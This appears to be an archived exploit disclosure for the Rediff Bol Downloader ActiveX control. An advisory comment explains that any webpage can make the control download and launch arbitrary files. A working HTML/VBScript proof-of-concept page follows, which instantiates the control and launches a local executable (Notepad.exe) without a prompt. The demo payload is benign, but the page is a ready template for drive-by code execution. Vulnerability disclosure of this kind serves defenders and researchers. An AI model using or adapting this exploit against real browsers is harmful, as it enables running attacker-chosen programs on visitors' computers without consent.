@@ -1,0 +1,49 @@
+<!--
+Rediff Bol Downloader ActiveX Allows Downloading and Spawning Arbitary
+Files
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+Affected Program : Rediff Bol Download ActiveX
+ActiveX (OCX) Control that downloads the Rediff Bol Messenger
+setup and spawns it.
+
+
+Related URL : http://messenger.rediff.com/newbol/
+
+
+Discovered by : Gregory R. Panakkal
+
+
+Vulnerability Description :
+
+Rediff Bol Downloader ActiveX control allows any webpage
+to download and spawn file. These file can be of any type.
+No filtering is done.
+
+IE Displays an alert, if the code points to a executable file on the
+internet. But execution of local files displays no alert.
+
+
+Tested On :
+* IE 7.0.5730.11 (WinXP SP2)
+* IE 6.0.2900.2180 (WinXP SP2)
+-->
+
+<html>
+
+<body>
+<OBJECT id="rboldwn" WIDTH=445 HEIGHT=40 classid="clsid:BADA82CB-BF48-4D76-9611-78E2C6F49F03" codebase="http://imdownloads.rediff.com/newbol/Bol.CAB">
+</OBJECT>
+
+<script language="vbscript">
+ rboldwn.url = "file://C:/WINNT/Notepad.exe"
+ rboldwn.fontsize = 14
+ rboldwn.barcolor = EE4E00
+ rboldwn.start = "start"
+</script>
+
+</body>
+</html>
+
+# milw0rm.com [2006-12-31]
